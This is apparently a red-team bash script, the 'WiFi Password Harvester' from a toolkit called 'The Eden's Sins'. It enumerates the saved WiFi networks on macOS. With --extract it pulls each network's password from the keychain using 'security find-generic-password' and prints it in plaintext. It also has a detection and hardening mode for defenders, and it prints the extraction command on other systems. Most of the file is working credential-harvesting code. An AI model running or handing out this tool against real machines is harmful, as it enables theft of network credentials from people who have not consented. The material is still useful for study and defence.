#!/usr/bin/env bash
# ============================================================
# WiFi Password Harvester — The Eden's Sins
# MITRE ATT&CK: T1555.001 Credentials from Keychain
#
# Extracts saved WiFi passwords from macOS keychain.
# Requires: sudo or user keychain access (macOS will prompt).
#
# Usage:
#   bash wifi_harvest.sh                 # List SSIDs only (safe)
#   bash wifi_harvest.sh --extract       # Extract passwords (needs auth)
#   bash wifi_harvest.sh --detect        # Blue team guidance
# ============================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

EXTRACT=false
[[ "${1:-}" == "--extract" ]] && EXTRACT=true
[[ "${1:-}" == "--detect" ]] && {
    echo ""
    echo "  BLUE TEAM — WiFi Credential Theft Detection"
    echo "  ════════════════════════════════════════════"
    echo ""
    echo "  Detection:"
    echo "    • Monitor: security find-generic-password -wa executions"
    echo "    • Alert on bulk keychain queries for AirPort passwords"
    echo "    • ESF: track access to keychain items of class genp + service AirPort"
    echo "    • osquery: SELECT * FROM wifi_networks; (shows SSIDs, no passwords)"
    echo ""
    echo "  Hardening:"
    echo "    • Set keychain to lock after 5 minutes of inactivity"
    echo "    • Use WPA3 Enterprise instead of PSK where possible"
    echo "    • Rotate WiFi passwords regularly"
    echo "    • Remove saved networks for untrusted/public WiFi"
    echo "    • MDM: prevent users from joining unapproved networks"
    echo ""
    exit 0
}

if [[ "$(uname)" != "Darwin" ]]; then
    echo "[!] Not macOS — documentation mode"
    echo ""
    echo "  WiFi passwords on macOS are stored in the keychain as"
    echo "  'AirPort network password' entries (class: genp, service: AirPort)."
    echo ""
    echo "  Extraction:"
    echo "    security find-generic-password -D 'AirPort network password' -wa 'SSID'"
    echo ""
    echo "  This requires either:"
    echo "    1. User clicks 'Allow' on the keychain prompt"
    echo "    2. Running as root with keychain unlocked"
    echo "    3. security unlock-keychain (with password)"
    exit 0
fi

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════╗"
echo "║  THE EDEN'S SINS — WiFi Password Harvester    ║"
echo "║  MITRE: T1555.001 Keychain Credentials         ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"

# ─── Enumerate saved networks ───
echo -e "${BOLD}  Saved WiFi Networks:${NC}"
echo ""

# Method 1: networksetup preferred networks
wifi_if=$(networksetup -listallhardwareports 2>/dev/null | grep -A1 "Wi-Fi" | grep "Device" | awk '{print $2}' || echo "en0")

# Current connection
current_ssid=$(networksetup -getairportnetwork "$wifi_if" 2>/dev/null | awk -F': ' '{print $2}' || echo "")
if [[ -n "$current_ssid" ]]; then
    echo -e "  📶 Currently connected: ${GREEN}${current_ssid}${NC}"
    echo ""
fi

# List preferred networks
ssid_count=0
echo -e "  ${BOLD}Preferred Networks:${NC}"
while IFS= read -r line; do
    ssid=$(echo "$line" | xargs)
    [[ -z "$ssid" ]] && continue
    ssid_count=$((ssid_count + 1))

    if $EXTRACT; then
        # Attempt password extraction
        pwd=$(security find-generic-password \
            -D "AirPort network password" \
            -a "$ssid" -w 2>/dev/null || echo "[denied/not found]")

        if [[ "$pwd" != "[denied/not found]" && -n "$pwd" ]]; then
            echo -e "    🔑 ${ssid}: ${RED}${pwd}${NC}"
        else
            echo -e "    🔒 ${ssid}: [password not accessible]"
        fi
    else
        echo "    📡 ${ssid}"
    fi
done < <(networksetup -listpreferredwirelessnetworks "$wifi_if" 2>/dev/null | tail -n +2)

echo ""
echo "═══════════════════════════════════"
echo "  Networks found: $ssid_count"
if ! $EXTRACT; then
    echo -e "  ${YELLOW}Use --extract to attempt password retrieval${NC}"
    echo "  (Will trigger keychain auth prompt on macOS)"
fi
echo "═══════════════════════════════════"
